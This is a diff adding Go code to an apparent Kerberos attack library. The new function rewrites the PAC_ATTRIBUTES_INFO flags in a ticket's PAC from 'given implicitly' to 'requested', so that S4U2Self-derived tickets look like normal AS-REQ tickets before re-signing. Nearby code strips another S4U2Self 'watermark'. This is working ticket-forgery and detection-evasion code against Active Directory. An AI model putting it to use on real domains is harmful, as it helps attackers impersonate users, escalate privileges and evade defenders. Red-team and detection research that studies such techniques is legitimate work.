@@ -871,6 +871,57 @@ const (
 	LogonResourceGroups  uint32 = 0x00000200 // S4U2Self watermark — resource groups inherited
 )
 
+// PAC_ATTRIBUTES_INFO flags (MS-PAC 2.14)
+const (
+	PACWasRequested        uint32 = 0x00000001 // Client sent pA-PAC-REQUEST (normal AS-REQ)
+	PACWasGivenImplicitly  uint32 = 0x00000002 // KDC gave PAC without explicit request (S4U2Self)
+)
+
+// RewritePACAttributesRequested rewrites PAC_ATTRIBUTES_INFO.Flags from
+// PAC_WAS_GIVEN_IMPLICITLY (0x2) to PAC_WAS_REQUESTED (0x1).
+//
+// The KDC sets Flags=0x2 when it issues a PAC without an explicit client request —
+// this is the S4U2Self case. A normal AS-REQ from a Windows client (which sends
+// pA-PAC-REQUEST) gets Flags=0x1. Rewriting makes the PAC look AS-REQ-derived.
+//
+// Operates on the ATTRIBUTES_INFO buffer (type 17). Clears the 0x2 bit and sets
+// the 0x1 bit while preserving any other flag bits. Signatures are recomputed
+// downstream by ResignPAC / ResignPACWithKeys.
+//
+// Returns the modified PAC bytes and the number of rewrites performed.
+func RewritePACAttributesRequested(pacData []byte) ([]byte, int) {
+	parsed, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return pacData, 0
+	}
+
+	out := make([]byte, len(pacData))
+	copy(out, pacData)
+	count := 0
+
+	for _, buf := range parsed.Buffers {
+		if buf.Type != AttributesType {
+			continue
+		}
+		bufStart := int(buf.Offset)
+		if buf.Size < 8 || bufStart+8 > len(out) {
+			continue
+		}
+		// PAC_ATTRIBUTES_INFO layout:
+		//   uint32 FlagsLength (bit count)
+		//   uint32 Flags
+		flagsOffset := bufStart + 4
+		flags := binary.LittleEndian.Uint32(out[flagsOffset : flagsOffset+4])
+		newFlags := (flags &^ PACWasGivenImplicitly) | PACWasRequested
+		if newFlags != flags {
+			binary.LittleEndian.PutUint32(out[flagsOffset:flagsOffset+4], newFlags)
+			count++
+		}
+	}
+
+	return out, count
+}
+
 // StripLogonResourceGroupsFlag clears the LOGON_RESOURCE_GROUPS (0x200) bit from
 // KERB_VALIDATION_INFO.UserFlags in the PAC's LOGON_INFO buffer.
 //
